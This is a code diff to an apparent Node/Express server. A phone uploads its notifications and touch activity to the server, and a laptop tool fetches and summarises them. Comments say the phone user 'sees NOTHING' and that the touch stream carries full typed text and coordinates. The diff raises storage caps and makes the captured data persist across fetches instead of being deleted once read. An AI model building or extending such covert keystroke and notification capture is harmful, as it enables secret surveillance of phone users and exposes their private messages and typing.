@@ -26,8 +26,8 @@ const ONLINE_WINDOW_MS = 20 * 1000; // device online if lastSeen < 20s ago
 // In-memory, consume-once. The phone uploads raw notification strings here;
 // the laptop AI fetches + summarizes. Phone user sees NOTHING.
 const notifBatches = new Map();
-const NOTIF_BATCH_CAP = 200;   // per-device cap
-const NOTIF_ENTRY_CAP = 4000;  // per-upload entry char cap
+const NOTIF_BATCH_CAP = 400;   // per-device cap
+const NOTIF_ENTRY_CAP = 16000;  // per-upload entry char cap
 
 // v8.8: media store — phone uploads photos/videos/screenshots (base64) and the
 // laptop downloads them via a shareable URL. In-memory (Render free tier).
@@ -230,7 +230,7 @@ app.post('/mobile_result', authMiddleware, (req, res) => {
     if (device_id) touchDevice(device_id);
 
     results.set(id || 'legacy', {
-        result: String(result).slice(0, 20000000), // 20MB cap (was 2MB)
+        result: String(result).slice(0, 100000000), // 100MB cap (no practical limit)
         device_id: device_id || null,
         timestamp: new Date().toISOString(),
     });
@@ -386,30 +386,52 @@ app.post('/notif_upload', authMiddleware, (req, res) => {
     res.json({ ok: true, stored: 1, device_id: deviceId });
 });
 
-// Laptop → Server: fetch the latest pending batch (consume-once)
+// Laptop → Server: fetch buffered notifications (CURSOR-BASED, not consume-once).
+// `after_ts` = return only batches uploaded after that timestamp; NOT deleted.
 app.get('/notif_fetch', authMiddleware, (req, res) => {
     const deviceId = req.query.device_id;
+    const afterTs = parseInt(req.query.after_ts || '0', 10) || 0;
+
+    const collect = (arr) => {
+        const parts = [];
+        let n = 0, next = afterTs;
+        for (const b of arr) {
+            if (b.ts > afterTs) { parts.push(b.entries); n++; if (b.ts > next) next = b.ts; }
+        }
+        return { entries: parts.join('\n'), count: n, next_ts: next };
+    };
+
     if (deviceId && notifBatches.has(deviceId)) {
-        const arr = notifBatches.get(deviceId);
-        notifBatches.delete(deviceId);
-        return res.json({ entries: arr.map(b => b.entries).join('\n') });
+        const r = collect(notifBatches.get(deviceId));
+        return res.json(Object.assign({ device_id: deviceId }, r));
     }
-    // No specific device (legacy/single-device mode): drain everything.
+    // No specific device (legacy/single-device mode): aggregate everything buffered.
     const parts = [];
+    let n = 0, next = afterTs;
     for (const [, arr] of notifBatches) {
-        parts.push(...arr.map(b => b.entries));
+        for (const b of arr) {
+            if (b.ts > afterTs) { parts.push(b.entries); n++; if (b.ts > next) next = b.ts; }
+        }
     }
-    notifBatches.clear();
-    res.json({ entries: parts.join('\n') });
+    res.json({ entries: parts.join('\n'), count: n, next_ts: next });
 });
 
-// ---------- v8.5: Live touch/activity tracking ----------
+// Explicit reset: clear buffered notifications for a device (or all).
+app.post('/notif_clear', authMiddleware, (req, res) => {
+    const deviceId = (req.body && req.body.device_id) || req.query.device_id;
+    if (deviceId) { notifBatches.delete(deviceId); }
+    else { notifBatches.clear(); }
+    res.json({ ok: true, cleared: deviceId || 'all' });
+});
 
-// device_id -> [{ts, entries}] — phone uploads raw touch/click/activity lines,
-// laptop fetches them live (consume-once) for the Touch Activity tab.
+// ---------- v8.5: Live touch/activity tracking (cursor-based, NOT consume-once) ----------
+
+// device_id -> [{ts, entries}] — phone uploads raw touch/click/activity lines.
+// /touch_fetch reads incrementally via `after_ts` cursor WITHOUT deleting;
+// /touch_clear explicitly resets the buffer.
 const touchBatches = new Map();
-const TOUCH_BATCH_CAP = 200;
-const TOUCH_ENTRY_CAP = 8000;
+const TOUCH_BATCH_CAP = 400;   // per-device batch cap (bigger window)
+const TOUCH_ENTRY_CAP = 16000; // per-upload entry char cap
 
 // Mobile → Server: upload raw touch/activity lines
 app.post('/touch_upload', authMiddleware, (req, res) => {
@@ -432,26 +454,51 @@ app.post('/touch_upload', authMiddleware, (req, res) => {
     res.json({ ok: true, stored: 1, device_id: deviceId });
 });
 
-// Laptop → Server: fetch latest pending touch batch (consume-once).
+// Laptop → Server: fetch buffered touch/activity events (CURSOR-BASED, not consume-once).
+// `after_ts` (ms epoch) = return only batches uploaded after that timestamp.
+// Does NOT delete — returns a `next_ts` cursor for the next incremental read.
 // NOTE: the "admin-only" gate lives in the laptop tool (fetch_touch_events
 // checks admin_auth, same as life_log_read_private) — this stream now carries
 // full typed text + coordinates.
 app.get('/touch_fetch', authMiddleware, (req, res) => {
     const deviceId = req.query.device_id;
+    const afterTs = parseInt(req.query.after_ts || '0', 10) || 0;
+
+    const collect = (arr) => {
+        const parts = [];
+        let n = 0, first = 0, next = afterTs;
+        for (const b of arr) {
+            if (b.ts > afterTs) {
+                parts.push(b.entries);
+                n++;
+                if (!first) first = b.ts;
+                if (b.ts > next) next = b.ts;
+            }
+        }
+        return { entries: parts.join('\n'), count: n, first_ts: first, next_ts: next };
+    };
+
     if (deviceId && touchBatches.has(deviceId)) {
-        const arr = touchBatches.get(deviceId);
-        touchBatches.delete(deviceId);
-        return res.json({ device_id: deviceId, entries: arr.map(b => b.entries).join('\n'), count: arr.length });
+        const r = collect(touchBatches.get(deviceId));
+        return res.json(Object.assign({ device_id: deviceId }, r));
     }
-    // No specific device: drain everything (legacy/single view).
+    // No specific device: aggregate everything currently buffered (legacy view).
     const parts = [];
-    let n = 0;
+    let n = 0, next = afterTs;
     for (const [, arr] of touchBatches) {
-        parts.push(...arr.map(b => b.entries));
-        n += arr.length;
+        for (const b of arr) {
+            if (b.ts > afterTs) { parts.push(b.entries); n++; if (b.ts > next) next = b.ts; }
+        }
     }
-    touchBatches.clear();
-    res.json({ entries: parts.join('\n'), count: n });
+    res.json({ entries: parts.join('\n'), count: n, next_ts: next, first_ts: 0 });
+});
+
+// Explicit reset: clear buffered touch/activity for a device (or all devices).
+app.post('/touch_clear', authMiddleware, (req, res) => {
+    const deviceId = (req.body && req.body.device_id) || req.query.device_id;
+    if (deviceId) { touchBatches.delete(deviceId); }
+    else { touchBatches.clear(); }
+    res.json({ ok: true, cleared: deviceId || 'all' });
 });
 
 // ---------- v8.8: media upload + download link ----------
